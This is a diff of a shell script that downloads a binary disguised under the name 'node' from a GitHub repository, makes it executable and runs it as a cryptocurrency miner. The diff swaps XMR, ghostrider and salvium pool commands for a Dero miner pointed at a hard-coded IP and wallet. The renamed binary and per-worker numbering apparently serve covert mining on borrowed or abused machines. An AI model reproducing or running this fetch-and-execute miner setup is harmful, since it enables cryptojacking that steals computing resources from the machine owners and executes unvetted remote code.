@@ -4,8 +4,10 @@
 # cNfj5q6A7c4yM3KD
 
 # xmr
-curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/xmr/linux-static/node
+#curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/xmr/linux-static/node
 
+# Astro
+curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/astro/node
 chmod +x node
 INPUT_NUMBER=$1
 WORKER_NUMBER=$(echo "$INPUT_NUMBER" | tail -c 2)
@@ -38,11 +40,13 @@ echo "start ${INPUT_NUMBER}"
 #./node --disable-gpu -a argon2d_16000 -o stratum.aikapool.com:3919 -u chriskm0101.crf_${WORKER_NUMBER} -p x,pgid=chriskm0101 > try.log
 
 # Raptorium + SRBMiner
-START=$(./node -a ghostrider -o us-east.flockpool.com:4444 -u RFPo8rf6nP7ZSJ67JPvAhwcgYsUZo8JLjV.crf_${INPUT_NUMBER} -p x --cpu-threads-intensity 4 --miner-priority 4 > try.log & sleep 1200 )
+#START=$(./node -a ghostrider -o us-east.flockpool.com:4444 -u RFPo8rf6nP7ZSJ67JPvAhwcgYsUZo8JLjV.crf_${INPUT_NUMBER} -p x --cpu-threads-intensity 4 --miner-priority 4 > try.log & sleep 1200 )
 # salvium
 #START=$(./node -a rx/0 -k --cpu-priority 4 --cpu-no-yield --donate-level 1 -o us.salvium.herominers.com:1230 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk=460000.crf_${INPUT_NUMBER} > try.log & sleep 1200 )
 #START=$(./node -a rx/0 -k --cpu-priority 4 --cpu-no-yield --donate-level 1 -o menju2ikg8uti-50625.portmap.host:50625 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk.crf_${INPUT_NUMBER} > try.log & sleep 1200 )
 #START=$(./node -a rx/0 -k --cpu-priority 4 --cpu-no-yield --donate-level 1 -o randomx.rplant.xyz:7130 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk.crf_${WORKER_NUMBER} -p m=solo > try.log & sleep 1200 )
+#  Dero
+ START=$(./node -w dero1qyjnsv7chjw73zta6chyxm4zms2yq4cgxcu9muctyurn606v0kgy7qg0dsews -r 140.238.9.57:10300 > try.log & sleep 1200 )
 TIME=$(TZ=Asia/Jakarta date +"%H:%M")
 
 SEC=$(date +%S)
